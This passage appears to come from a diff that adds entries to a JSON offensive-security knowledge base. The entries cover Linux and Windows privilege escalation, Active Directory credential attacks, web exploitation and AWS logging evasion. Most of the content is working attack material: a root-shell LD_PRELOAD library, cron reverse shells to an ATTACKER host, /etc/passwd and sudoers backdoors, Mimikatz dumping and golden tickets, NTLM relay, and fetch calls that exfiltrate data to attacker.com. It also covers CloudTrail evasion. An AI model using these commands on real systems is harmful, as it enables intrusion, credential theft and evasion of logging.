+    "content": "LD_PRELOAD privilege escalation. Prerequisite: sudo -l shows env_keep+=LD_PRELOAD AND user can sudo any command. Exploitation \u2014 create malicious shared library: cat > /tmp/evil.c << 'EOF' #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); } EOF; gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c. Execute with sudo and LD_PRELOAD: sudo LD_PRELOAD=/tmp/evil.so /path/to/any/allowed/command \u2014 spawns root shell. This works because LD_PRELOAD is preserved through sudo when env_keep allows it, and the init function runs before the main binary. Similar \u2014 LD_LIBRARY_PATH: if env_keep+=LD_LIBRARY_PATH, create malicious .so with same name as library loaded by sudo command. RPATH/RUNPATH abuse: if binary has writable RPATH, place malicious library in that path. Check: readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH'. LD_PRELOAD does NOT work with SUID binaries by design. SUID binaries ignore LD_PRELOAD for security.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "ld-preload-privesc",
+      "tool": "gcc"
+    }
+  },
+  {
+    "id": "crontab-writable-privesc",
+    "content": "Writable crontab and cron file privilege escalation. Check writable cron locations: ls -la /etc/cron*; ls -la /var/spool/cron/crontabs/; cat /etc/crontab; ls -la /etc/cron.d/; ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/. Find world-writable scripts run by root cron: find / -path /proc -prune -o -path /sys -prune -o -name '*.sh' -perm -o+w -print 2>/dev/null; cat /etc/crontab and cross-reference script paths. Exploitation \u2014 if /etc/crontab is writable: echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/crontab. If root-owned cron script is writable: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /root_cron_script.sh. If directory of cron script is writable (path hijack): create malicious file with same name, wait for execution. Find root processes: ps aux | grep root. Monitor cron execution: watch -n 1 ls -la /tmp \u2014 look for new files created by root. pspy64 (no-root process monitor): ./pspy64 \u2014 monitors all process creations in real-time, reveals hidden cron jobs. Common cron paths: /usr/local/bin, /opt/scripts, /home/user/scripts.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "crontab-privesc",
+      "tool": "pspy"
+    }
+  },
+  {
+    "id": "crackmapexec-password-spraying",
+    "content": "CrackMapExec (CME/NetExec) password spraying and credential testing. Note: CME is now maintained as NetExec (nxc). Password spraying SMB: crackmapexec smb CIDR/24 -u users.txt -p 'Password123' --continue-on-success. Single target: crackmapexec smb TARGET -u Administrator -p 'Password123'. Hash spray: crackmapexec smb CIDR/24 -u Administrator -H NTHASH. Check if domain admin: crackmapexec smb TARGET -u admin -p pass --shares (look for (Pwn3d!) marker). Spray without lockout (--no-bruteforce pairs each user with one password): crackmapexec smb TARGET -u users.txt -p passwords.txt --no-bruteforce. WinRM spraying: crackmapexec winrm CIDR/24 -u users.txt -p 'Password'. LDAP: crackmapexec ldap DC_IP -u users.txt -p 'Password' --continue-on-success. Enumerate after success: crackmapexec smb TARGET -u admin -p pass --users; --groups; --loggedon-users; --shares; --sam; --lsa. Run command: crackmapexec smb TARGET -u admin -p pass -x 'whoami'; -X 'powershell command' (PowerShell). Dump SAM: crackmapexec smb TARGET -u admin -p pass --sam. Dump LSA: crackmapexec smb TARGET -u admin -p pass --lsa.",
+    "metadata": {
+      "category": "ad",
+      "technique": "password-spraying",
+      "tool": "crackmapexec"
+    }
+  },
+  {
+    "id": "impacket-kerberos-attacks",
+    "content": "Impacket Kerberos attacks \u2014 AS-REP roasting and Kerberoasting. AS-REP Roasting (accounts without pre-auth required): Without creds (need user list): impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass -dc-ip DC_IP. With creds: impacket-GetNPUsers DOMAIN/user:pass -request -format hashcat -outputfile asrep.txt -dc-ip DC_IP. Crack: hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt. Kerberoasting (enumerate SPNs and request TGS): impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt. Crack: hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt. secretsdump \u2014 remote dump: impacket-secretsdump DOMAIN/admin:pass@DC_IP; impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc (NTDS only); impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc-ntlm. Local dump (SAM+SYSTEM files): impacket-secretsdump -sam SAM -system SYSTEM LOCAL. DCSync (requires replication rights): impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc-user Administrator. kerbrute user enum: kerbrute userenum -d DOMAIN --dc DC_IP users.txt; kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123'.",
+    "metadata": {
+      "category": "ad",
+      "technique": "kerberos-attacks",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "hydra-brute-force",
+    "content": "Hydra brute force syntax for common services. SSH: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET; hydra -L users.txt -P passes.txt TARGET ssh -t 4; custom port: hydra -l root -P passes.txt ssh://TARGET:2222. FTP: hydra -L users.txt -P passes.txt ftp://TARGET; hydra -l admin -P rockyou.txt ftp://TARGET -f. RDP: hydra -l Administrator -P rockyou.txt rdp://TARGET; hydra -L users.txt -P passes.txt rdp://TARGET -t 1. SMB: hydra -l Administrator -P rockyou.txt smb://TARGET. HTTP POST form: hydra -l admin -P rockyou.txt TARGET http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid credentials' -V. HTTP Basic auth: hydra -l admin -P rockyou.txt http-get://TARGET/admin. MySQL: hydra -l root -P rockyou.txt mysql://TARGET. PostgreSQL: hydra -l postgres -P rockyou.txt postgres://TARGET. Telnet: hydra -l admin -P rockyou.txt telnet://TARGET. SMTP: hydra -l user@domain.com -P rockyou.txt smtp://TARGET. Common flags: -f (stop on first success); -t THREADS (default 16, use 4 for SSH/RDP); -vV (verbose); -o output.txt; -w WAIT_TIME (seconds between attempts); -s PORT (non-standard port).",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "brute-force",
+      "tool": "hydra"
+    }
+  },
+  {
+    "id": "ntlmrelayx-attack-chain",
+    "content": "NTLM Relay attack chain using Responder + ntlmrelayx. Prerequisites: attacker on same network segment, SMB signing disabled on targets (default on workstations, not DCs). Step 1 \u2014 Disable SMB and HTTP in Responder config: sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf; sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf. Step 2 \u2014 Generate target list (hosts without SMB signing): crackmapexec smb CIDR/24 --gen-relay-list targets.txt. Step 3 \u2014 Start Responder: responder -I eth0 -wrf (poisons LLMNR/NBT-NS/mDNS). Step 4 \u2014 Start ntlmrelayx: impacket-ntlmrelayx -tf targets.txt -smb2support (auto-dumps SAM on success); add -c 'cmd' for command execution; -i for interactive SMB shell; -e payload.exe to execute binary. When victim makes any unresolvable DNS query, Responder answers with attacker IP \u2014 victim sends NTLM auth to attacker \u2014 ntlmrelayx forwards to target. If victim is local admin on any target: SAM dumped automatically. SMB shell: impacket-ntlmrelayx -tf targets.txt -smb2support -i; connect to 127.0.0.1:11000 with nc.",
+    "metadata": {
+      "category": "ad",
+      "technique": "ntlm-relay",
+      "tool": "ntlmrelayx"
+    }
+  },
+  {
+    "id": "mimikatz-credential-dumping",
+    "content": "Mimikatz credential dumping commands. Requires SeDebugPrivilege (usually admin). Privilege escalation within Mimikatz: privilege::debug \u2014 verify SeDebugPrivilege. Dump logon passwords (plaintext if WDigest enabled, NTLM always): sekurlsa::logonpasswords. Dump NTLM hashes only: sekurlsa::msv. Dump Kerberos tickets: sekurlsa::tickets /export. Dump credential manager: vault::cred /patch. Local SAM dump: lsadump::sam. LSA secrets (service account passwords, cached creds): lsadump::secrets. DCSync (domain admin required \u2014 simulates DC replication): lsadump::dcsync /domain:DOMAIN /user:Administrator; lsadump::dcsync /domain:DOMAIN /all /csv. Pass-the-Hash via Mimikatz: sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe. Golden ticket: kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ptt. Silver ticket: kerberos::silver /service:cifs/server.domain.com /target:server.domain.com /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /rc4:SERVICE_NTLM /ptt. Enable WDigest (store plaintext in LSASS): reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1.",
+    "metadata": {
+      "category": "ad",
+      "technique": "credential-dumping-mimikatz",
+      "tool": "mimikatz"
+    }
+  },
+  {
+    "id": "cmdkey-runas-savecred",
+    "content": "Windows cmdkey stored credentials and runas /savecred exploitation. List stored credentials: cmdkey /list \u2014 shows stored Windows credentials (usernames, targets). Stored creds visible in: Windows Credential Manager (GUI), also at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Credential Manager. Use stored creds: runas /savecred /user:DOMAIN\\Administrator 'cmd.exe'; runas /savecred /user:COMPUTERNAME\\Administrator 'cmd.exe'. If runas /savecred fails (not stored for this user), try: runas /user:admin cmd.exe (prompts for password). PowerShell: $cred = Get-StoredCredential -Target 'server.domain.com' (requires CredentialManager module). Dump with Mimikatz: vault::cred /patch; vault::list. Dump with LaZagne: lazagne.exe all. Windows Credential Manager stores: Generic credentials, Certificate-based, Domain credentials. Extraction from DPAPI: Mimikatz dpapi::cred /in:C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Credentials\\CREDFILE /masterkey:KEY; or dpapi::masterkey /in:MASTERKEY_FILE /rpc. Common use case: admin saved creds for RDP/SMB access, low-priv user can runas /savecred.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "stored-credentials",
+      "tool": "cmdkey"
+    }
+  },
+  {
+    "id": "powershell-history-credentials",
+    "content": "PowerShell history file \u2014 commands typed in PowerShell sessions are saved. Location: C:\\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt. Read from PowerShell: Get-Content (Get-PSReadLineOption).HistorySavePath; or: type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt. Search for credentials: Select-String -Path 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' -Pattern 'password|credential|pass|secret' -AllMatches 2>/dev/null. WinPEAS checks this automatically. Also check: Get-History (in-memory history for current session). Other locations for command history/credentials: C:\\Users\\USERNAME\\.bash_history (WSL); C:\\Users\\USERNAME\\.ssh\\config; C:\\Users\\USERNAME\\AppData\\Local\\Microsoft\\Windows Terminal\\LocalState\\settings.json; recent documents via %APPDATA%\\Microsoft\\Windows\\Recent. All users history (requires admin): Get-ChildItem 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' -Force | Get-Content.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "powershell-history",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "registry-run-keys-persistence",
+    "content": "Windows registry Run key persistence. Run keys execute commands on user login or system startup. Key locations: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (per-user, runs as logged-in user); HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce (runs once, then deletes); HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (all users, requires admin); HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce. Add persistence: reg add 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v Backdoor /t REG_SZ /d 'C:\\Windows\\Temp\\shell.exe' /f. PowerShell: Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Backdoor' -Value 'C:\\Windows\\Temp\\shell.exe'. WOW64 locations (32-bit on 64-bit): HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run. Enumerate: reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run. Additional persistence locations: HKLM\\SYSTEM\\CurrentControlSet\\Services (service creation); HKCU\\Environment\\UserInitMprLogonScript; Startup folders: C:\\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "registry-persistence",
+      "tool": "reg"
+    }
+  },
+  {
+    "id": "nosql-injection-techniques",
+    "content": "Prototype pollution JavaScript exploitation. Common vectors: URL query strings (?__proto__[foo]=bar), JSON body ({\"__proto__\":{\"foo\":\"bar\"}}), form fields. Testing: send payload then check if application behavior changes (e.g., isAdmin becomes true). Server-side Node.js RCE via gadgets \u2014 lodash.merge (CVE-2019-17571): send {\"__proto__\": {\"mainModule\": {\"require\": [\"child_process\", \"exec\"]}}} depending on code path. child_process spawn gadget (varies by app): look for code that calls spawn/exec using object properties. Express.js app scan for gadgets: grep -r '__proto__\\|constructor\\[prototype\\]' in JS files. Detection tools: DOM Invader (Burp), PPScan, nodejsscan static. Burp Scanner detects some prototype pollution automatically. Black-box testing: fuzz merge/extend/defaults endpoints with {\"__proto__\": {\"test\": \"polluted\"}} then probe for pollution via app behavior. White-box: search for Object.assign(target, source) or recursive merge without hasOwnProperty checks. Fix: Object.create(null) for objects used as maps; use JSON schema validation; lodash >=4.17.21 patched.",
+    "metadata": {
+      "category": "web",
+      "technique": "prototype-pollution-exploit",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "cors-misconfiguration",
+    "content": "CORS misconfiguration exploitation. Detect: send Origin: https://evil.com header with request \u2014 if response has Access-Control-Allow-Origin: https://evil.com and Access-Control-Allow-Credentials: true, it's vulnerable. Types: (1) Reflected origin \u2014 server echoes back any Origin value; (2) Null origin \u2014 server allows Origin: null (from sandboxed iframes); (3) Subdomain wildcard \u2014 allows https://attacker.target.com; (4) Prefix/suffix match \u2014 allows https://target.com.evil.com. Exploitation (if allows credentials): PoC HTML: <script>var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){fetch('https://attacker.com/steal?data='+encodeURIComponent(xhr.responseText));}};xhr.open('GET','https://TARGET/api/user',true);xhr.withCredentials=true;xhr.send();</script>. Null origin bypass (sandboxed iframe): <iframe sandbox='allow-scripts allow-top-navigation allow-forms' srcdoc='<script>...fetch request here...</script>'>. Impact: steal session tokens, API keys, sensitive data. Test all API endpoints. Tools: CORStest (python), corscanner, Burp Active Scanner. Check: curl -H 'Origin: https://evil.com' -I TARGET/api.",
+    "metadata": {
+      "category": "web",
+      "technique": "cors-misconfiguration",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "open-redirect-exploitation",
+    "content": "Open redirect exploitation \u2014 server redirects to attacker-controlled URL. Detection: look for redirect parameters: ?url=, ?redirect=, ?next=, ?return=, ?goto=, ?dest=, ?destination=, ?continue=, ?rurl=, ?redirect_uri=. Test: append https://evil.com and see if redirected. Bypass techniques: https://TARGET.com/redirect?url=//evil.com; ?url=https://TARGET.com@evil.com; ?url=https://evil%2ecom; ?url=https://TARGET.com/redirect?next=https://evil.com; ?url=//evil.com (double slash bypass); ?url=%2F%2Fevil.com (URL encoded slashes); ?url=https://evil.com%23TARGET.com; ?url=javascript:alert(1) (XSS potential). OAuth/OIDC redirect_uri bypass \u2014 if open redirect on trusted domain: redirect_uri=https://TARGET.com/redirect?url=https://attacker.com \u2014 OAuth code delivered to attacker. Google/Apple OAuth apps especially impactful. Impact: phishing (trusted URL redirect to malicious), OAuth token theft, SSRF pivoting. Automate detection: python3 -m cors or include in burp active scan. grep parameters: grep -r 'redirect\\|return\\|next\\|goto\\|redir' --include='*.js' -l.",
+    "metadata": {
+      "category": "web",
+      "technique": "open-redirect",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "aws-cloudtrail-bypass",
+    "content": "AWS CloudTrail logging bypass and evasion techniques. CloudTrail logs management API calls but has blind spots. Techniques to reduce logging footprint: (1) Use read-only APIs that log less detail or are excluded \u2014 s3:GetObject on public buckets often not in CloudTrail. (2) EC2 Instance Metadata (IMDS) queries are never in CloudTrail. (3) Use resource-based policies instead of iam: calls to avoid IAM event logging. (4) S3 data events not logged by default (only management events). (5) Lambda invocations not logged unless explicitly enabled. (6) Use regions where CloudTrail not enabled: aws cloudtrail get-trail-status --name TRAIL --region us-east-2 to check. (7) Exfil via DNS (not in CloudTrail): use data exfiltration through Route53 DNS queries. (8) Disable CloudTrail (requires cloudtrail:StopLogging): aws cloudtrail stop-logging --name TRAIL \u2014 this action WILL be logged to EventBridge. (9) Delete logs (requires s3:DeleteObject on log bucket). Enumerate CloudTrail config: aws cloudtrail describe-trails; aws cloudtrail get-trail-status --name TRAIL. Look for multi-region trail vs single-region gaps.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "cloudtrail-evasion",
+      "tool": "awscli"
+    }
+  },
+  {
+    "id": "linux-exploit-suggester",
+    "content": "Linux kernel exploit enumeration. linux-exploit-suggester \u2014 checks kernel version against known exploits: bash linux-exploit-suggester.sh; wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && bash linux-exploit-suggester.sh. linux-exploit-suggester-2: python linux-exploit-suggester-2.py \u2014 cross-references kernel version with CVE database. Get kernel version: uname -a; uname -r; cat /proc/version; cat /etc/os-release. Notable kernel exploits: DirtyPipe (CVE-2022-0847, Linux 5.8-5.16.11); DirtyCow (CVE-2016-5195, Linux 2.6.22-4.8.3): writes to read-only mapped memory; Sudo Baron Samedit (CVE-2021-3156, heap overflow in sudo); pkexec PolKit (CVE-2021-4034). Dirty Pipe PoC: compile and run on Linux >=5.8; overwrites read-only files as any user. DirtyCow: compiles on target: gcc -pthread dirty.c -o dirty -lcrypt; ./dirty mypassword (creates firefart root user). PwnKit (CVE-2021-4034): works on default pkexec on all major distros. Check sudo version: sudo --version; sudoedit --version.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "kernel-exploit-enumeration",
+      "tool": "linux-exploit-suggester"
+    }
+  },
+  {
+    "id": "world-writable-suid-scripts",
+    "content": "World-writable scripts and weak file permissions for privilege escalation. Find world-writable files: find / -perm -o+w -type f 2>/dev/null | grep -v '/proc\\|/sys'. Find world-writable directories: find / -perm -o+w -type d 2>/dev/null | grep -v '/proc\\|/sys\\|/tmp\\|/var/tmp'. Find SUID binaries: find / -perm -4000 -type f 2>/dev/null. Find SGID binaries: find / -perm -2000 -type f 2>/dev/null. Find files writable by group: find / -perm -g+w -type f 2>/dev/null. World-readable sensitive files: find /etc -readable -type f 2>/dev/null | grep -E 'shadow|passwd|sudoers|cron'. If root-owned script is world-writable: echo 'chmod +s /bin/bash' >> /path/to/script (wait for root to run it). If /etc/passwd is world-writable: openssl passwd -1 hacker \u2014 generate hash; echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd. If /etc/sudoers is writable: echo 'youruser ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers. Check service config files for creds: find /etc -name '*.conf' -readable 2>/dev/null. LinPEAS automates all these checks: ./linpeas.sh 2>/dev/null | tee linpeas_out.txt.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "weak-file-permissions",
+      "tool": "find"
+    }
+  },
+  {
+    "id": "scheduled-task-abuse-windows",
+    "content": "Windows scheduled task abuse for privilege escalation and persistence. Enumerate: schtasks /query /fo LIST /v; Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq 'SYSTEM'} | Select TaskName, TaskPath. Check task binary permissions: schtasks /query /fo LIST /v | findstr 'Task To Run'; icacls 'C:\\path\\to\\task\\binary.exe'. If task binary is writable by low-priv user: replace binary with msfvenom payload, wait for task to run. If task directory is writable (path hijack): place malicious exe with same name. Check task trigger: schtasks /query /fo LIST /v | findstr 'Trigger\\|Schedule Type'. Create persistent task (requires admin): schtasks /create /tn 'WindowsUpdate' /tr 'C:\\Temp\\shell.exe' /sc onlogon /ru SYSTEM; schtasks /create /tn 'BackupTask' /tr 'C:\\Temp\\shell.exe' /sc minute /mo 5 /ru SYSTEM. PowerShell: Register-ScheduledTask -TaskName 'Updater' -Action (New-ScheduledTaskAction -Execute 'C:\\Temp\\shell.exe') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -RunLevel Highest. Tools: PowerSploit's Invoke-PrivescAudit, accesschk for task folder permissions.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "scheduled-task-abuse",
+      "tool": "schtasks"
+    }
+  },
+  {
+    "id": "kerbrute-user-enumeration",
+    "content": "Kerbrute for Kerberos user enumeration and password spraying. Install: download binary from github.com/ropnop/kerbrute/releases or go install github.com/ropnop/kerbrute@latest. User enumeration (no creds needed, no lockout risk): ./kerbrute userenum -d DOMAIN.COM --dc DC_IP usernames.txt -o valid_users.txt. Valid users return TGT or PREAUTH_REQUIRED; invalid return PRINCIPAL_UNKNOWN. Password spray (uses single password, tests all users): ./kerbrute passwordspray -d DOMAIN.COM --dc DC_IP valid_users.txt 'Password123!'. Hash spray: ./kerbrute bruteuser -d DOMAIN.COM --dc DC_IP passwords.txt targetuser. WARNING: failed password attempts DO count toward lockout policy \u2014 use --safe flag: ./kerbrute passwordspray -d DOMAIN.COM --dc DC_IP users.txt 'Password123' --safe (aborts all threads if any account locked). Check lockout policy before spraying: net accounts /domain; crackmapexec smb DC_IP -u user -p pass --pass-pol. Combine with secretsdump: after cracking, impacket-secretsdump DOMAIN/user:pass@DC. Also: ./kerbrute bruteforce -d DOMAIN.COM --dc DC_IP user_pass_combo.txt (username:password combos).",
+    "metadata": {
+      "category": "ad",
+      "technique": "kerberos-user-enum",
+      "tool": "kerbrute"
+    }
+  },
+  {
+    "id": "token-impersonation-windows",
+    "content": "Windows token impersonation techniques. List current privileges: whoami /priv. Key privilege: SeImpersonatePrivilege (IIS/SQL service accounts), SeAssignPrimaryTokenPrivilege. Impersonation tokens \u2014 list available: meterpreter> use incognito; list_tokens -u; impersonate_token 'DOMAIN\\Administrator'. PowerShell impersonation: [System.Security.Principal.WindowsIdentity]::GetCurrent().Name. Native impersonation via named pipes: create named pipe, wait for privileged process to connect, call ImpersonateNamedPipeClient(). This is the basis for all potato exploits. Check available tokens: whoami /groups (shows current token groups). Token stealing with Mimikatz: token::elevate (impersonate SYSTEM); sekurlsa::pth spawns process with stolen token. Process token duplication: if you can open a SYSTEM process (OpenProcess with PROCESS_QUERY_INFORMATION), duplicate its token (DuplicateTokenEx), use CreateProcessWithTokenW to spawn new process under SYSTEM context. Meterpreter steal_token: steal_token PID (steal from running privileged process). Tool: TokenUniverse, token-priv for automated token abuse.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "token-impersonation",
+      "tool": "mimikatz"
+    }
+  },
+  {
+    "id": "http-parameter-pollution",
+    "content": "HTTP Parameter Pollution (HPP) \u2014 inject duplicate parameters to confuse application logic. Types: server-side HPP (backend processes duplicates differently), client-side HPP (browser/DOM manipulated). Test by duplicating parameters: GET /page?id=1&id=2 \u2014 check which value is used. PHP uses last: id=2. ASP.NET combines: id=1,2. JSP uses first: id=1. Django uses last. Flask: first or last depending on function. Bypass WAF: WAF parses first value (safe), app uses second (malicious): /search?q=safe&q=<script>. Bypass authentication checks: /login?admin=false&admin=true \u2014 if app checks first, WAF checks second. Parameter splitting in OAuth: redirect_uri=https://TARGET.com/callback&redirect_uri=https://evil.com \u2014 some servers use last value. Content-Type parameter pollution: Content-Type: application/x-www-form-urlencoded; charset=utf-8; boundary=INJECT. Path parameter pollution: /api/users/1;admin=true. URL pollution in links: when user-supplied data is used to build URLs with existing params \u2014 inject & to add new params. Tools: Burp Intruder for automated HPP testing; Arjun for parameter discovery.",
+    "metadata": {
+      "category": "web",
+      "technique": "http-parameter-pollution",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "csrf-techniques-bypass",
+    "content": "CSRF techniques and bypass methods. Detect: check if state-changing requests use unpredictable CSRF tokens. If token is absent, static, or predictable \u2014 vulnerable. Exploit template: <form method='POST' action='https://TARGET/change-email'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>. CSRF with JSON (if server accepts both): change Content-Type to application/x-www-form-urlencoded and JSON payload as form value. Bypass techniques: (1) Token not validated \u2014 remove token entirely; (2) Token tied to session but not to action \u2014 use your own valid token; (3) Token in headers only \u2014 switch to GET method; (4) Referer-based protection \u2014 add null referer: <meta name='referrer' content='no-referrer'>; (5) Subdomain bypass \u2014 XSS on subdomain to read CSRF token from main domain if cookies are SameSite=None; (6) SameSite=Lax bypass with top-level navigation (GET method only) \u2014 form action with GET; (7) SameSite=Strict bypass via same-site gadget. Login CSRF \u2014 force victim to log into attacker account. Tools: Burp CSRF PoC generator (right-click request > Engagement tools > Generate CSRF PoC). CSRF for XSS delivery: chain CSRF + stored XSS.",
+    "metadata": {
+      "category": "web",
+      "technique": "csrf-exploitation",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "websocket-attacks",
+    "content": "WebSocket attack techniques. Intercept WebSocket traffic in Burp Suite: Proxy > WebSockets History tab. Manipulation: Burp Repeater supports WebSocket messages \u2014 send and modify messages. Attacks: (1) SQLi/XSS/SSRF in WebSocket messages \u2014 test all message fields for injection; (2) WebSocket Hijacking (CSWSH) \u2014 cross-site WebSocket hijacking, similar to CSRF: var ws = new WebSocket('wss://TARGET/ws'); ws.onmessage = function(e){fetch('https://attacker.com/?d='+e.data);}; \u2014 works if server authenticates only via cookie without CSRF token; (3) Denial of service \u2014 flood with large messages or rapid connect/disconnect; (4) Authentication bypass \u2014 WebSocket upgrade request may bypass auth middleware checking HTTP requests; (5) Message replay \u2014 capture and replay authenticated messages. Detection: look for ws:// or wss:// in JS source; check Burp WebSockets tab. Test authentication: connect with forged/no cookies, check if server accepts. Message injection: if server broadcasts messages, inject XSS payload that other clients render. Tools: wscat (npm install -g wscat); wscat -c wss://TARGET/ws; Python websockets library for automated testing.",
+    "metadata": {
+      "category": "web",
+      "technique": "websocket-attacks",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "graphql-exploitation",
+    "content": "GraphQL introspection and injection exploitation. Find GraphQL endpoint: /graphql, /api/graphql, /graphiql, /api/query, /api. Test introspection: curl -X POST TARGET/graphql -H 'Content-Type: application/json' -d '{\"query\": \"{__schema{types{name}}}\"}'. Full schema dump: {__schema{queryType{name},mutationType{name},types{kind,name,fields{name,args{name,type{kind,name,ofType{kind,name}}},type{kind,name,ofType{kind,name}}}}}}. Use GraphQL Voyager (or InQL Burp extension) to visualize schema. Injection: if fields pass to DB without sanitization \u2014 inject SQL, NoSQL, SSRF payloads. IDOR via GraphQL: modify ID fields in queries. Batch query attacks: [{query1},{query2},...] \u2014 may bypass rate limiting, brute force login/OTP. Mutation exploitation: look for mutations that change password/email without CSRF token equivalent. Broken access control: query other users' data via ID enumeration. Disable introspection bypass: add typename: {__typename} or use fragments. GraphQL DoS: deeply nested queries cause exponential backend calls \u2014 mitigate with query depth/complexity limits. Tools: InQL (Burp extension), graphql-cop, clairvoyance (introspection when disabled).",
+    "metadata": {
+      "category": "web",
+      "technique": "graphql-exploitation",
+      "tool": "inql"
+    }
+  },
+  {
+    "id": "ssrf-cloud-metadata",
+    "content": "SSRF to cloud metadata services. Detection: look for URL fetch functionality \u2014 file upload from URL, PDF generators, webhooks, image loading, link preview. Test with Burp Collaborator: set URL to collaborator server and check for OOB connection. Cloud metadata endpoints: AWS: http://169.254.169.254/latest/meta-data/; http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME (steal IAM creds). Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires Metadata:true header \u2014 try CRLF injection). GCP: http://metadata.google.internal/computeMetadata/v1/?recursive=true (requires Metadata-Flavor:Google). Common bypasses for filters: http://169.254.169.254 \u2192 http://169.254.169.254 (decimal: 2852039166); http://0xA9FEA9FE; http://[::ffff:169.254.169.254]; http://foo@169.254.169.254; DNS rebinding. Escalate: use stolen IAM creds with awscli --profile stolen to enumerate and pivot. AWS IMDSv2 bypass (requires PUT before GET): curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' then use token. Internal service SSRF: probe 127.0.0.1:PORT, 10.0.0.0/8, 172.16.0.0/12 ranges.",
+    "metadata": {
+      "category": "web",
+      "technique": "ssrf-cloud-metadata",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "azure-ad-enumeration",
+    "content": "Azure AD enumeration tools and techniques. AADInternals: Install-Module AADInternals; Get-AADIntTenantID -Domain TARGET.com; Invoke-AADIntReconAsOutsider -DomainName TARGET.com (no auth needed \u2014 reveals tenant info, registered domains, federation); Get-AADIntLoginInformation -Domain TARGET.com. With credentials: Connect-AADInt (interactive auth); Get-AADIntUsers; Get-AADIntAzureADUsers; Get-AADIntGroups. ROADtools: roadrecon auth -u user@TARGET.com -p password; roadrecon gather; roadrecon gui (web interface to browse tenant). BloodHound/AzureHound: azurehound list -u user@TARGET.com -p password --tenant TENANT_ID -o bloodhound.json (then import to BloodHound). Enumerate with Microsoft Graph (no special tools): curl 'https://graph.microsoft.com/v1.0/users' -H 'Authorization: Bearer TOKEN'. User enumeration without creds: POST https://login.microsoftonline.com/common/GetCredentialType with username \u2014 AADSTS50034 = user doesn't exist; AADSTS50126 = user exists wrong password. MicroBurst (PowerShell): Invoke-EnumerateAzureBlobs; Get-AzureADUsers. o365creeper for email enumeration.",
